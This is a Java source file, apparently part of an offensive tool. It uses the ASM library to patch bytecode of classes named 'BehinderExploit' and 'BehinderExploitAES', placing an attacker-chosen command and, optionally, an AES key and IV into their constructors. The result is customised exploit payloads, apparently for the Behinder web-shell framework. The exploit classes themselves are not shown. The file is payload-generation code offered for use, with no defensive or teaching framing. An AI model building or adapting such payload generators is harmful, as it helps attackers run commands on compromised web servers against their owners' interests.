package com.feihong.asm;

import org.objectweb.asm.*;
import java.io.IOException;
import static org.objectweb.asm.Opcodes.*;
import static org.objectweb.asm.Opcodes.PUTFIELD;

public class AsmForBehind {
    private String cmd;
    private String key;
    private String iv;
    private boolean encrypt;


    public AsmForBehind(String cmd, boolean encrypt, String key, String iv){
        this.cmd = cmd;
        this.key = key;
        this.encrypt = encrypt;
        this.iv = iv;
    }

    public byte[] process(){
        try{
            ClassReader cr;
            if(encrypt){
                cr = new ClassReader("com.feihong.asm.BehinderExploitAES");
            }else{
                cr = new ClassReader("com.feihong.asm.BehinderExploit");
            }
            ClassWriter cw = new ClassWriter(cr, ClassWriter.COMPUTE_MAXS);

            cr.accept(new ClassVisitor(Opcodes.ASM6, cw) {
                @Override
                public MethodVisitor visitMethod(int access, String name, String descriptor, String signature,
                                                 String[] exceptions) {
                    MethodVisitor methodVisitor = super.visitMethod(access, name, descriptor, signature, exceptions);
                    if (name.trim().equals("<init>")) {
                        return new ModifyMethod(methodVisitor);
                    }

                    return methodVisitor;
                }
            }, Opcodes.ASM6);

            return cw.toByteArray();
        }catch(IOException e){
            e.printStackTrace();
        }

        return "".getBytes();
    }

    private class ModifyMethod extends MethodVisitor {
        public ModifyMethod(MethodVisitor mv) {
            super(Opcodes.ASM6, mv);
        }

        @Override
        public void visitInsn(int opcode) {
            if (opcode == Opcodes.RETURN) {
                //动态修改实例属性age的值
                if(encrypt){
                    mv.visitVarInsn(ALOAD, 0);
                    mv.visitLdcInsn(cmd);
                    mv.visitFieldInsn(PUTFIELD, "com/feihong/asm/BehinderExploitAES", "str", "Ljava/lang/String;");
                    mv.visitVarInsn(ALOAD, 0);
                    mv.visitLdcInsn(key);
                    mv.visitFieldInsn(PUTFIELD, "com/feihong/asm/BehinderExploitAES", "encryptKey", "Ljava/lang/String;");
                    mv.visitVarInsn(ALOAD, 0);
                    mv.visitLdcInsn(iv);
                    mv.visitFieldInsn(PUTFIELD, "com/feihong/asm/BehinderExploitAES", "iv", "Ljava/lang/String;");
                }else{
                    mv.visitVarInsn(ALOAD, 0);
                    mv.visitLdcInsn(cmd);
                    mv.visitFieldInsn(PUTFIELD, "com/feihong/asm/BehinderExploit", "str", "Ljava/lang/String;");
                }

            }
            super.visitInsn(opcode);
        }
    }

}
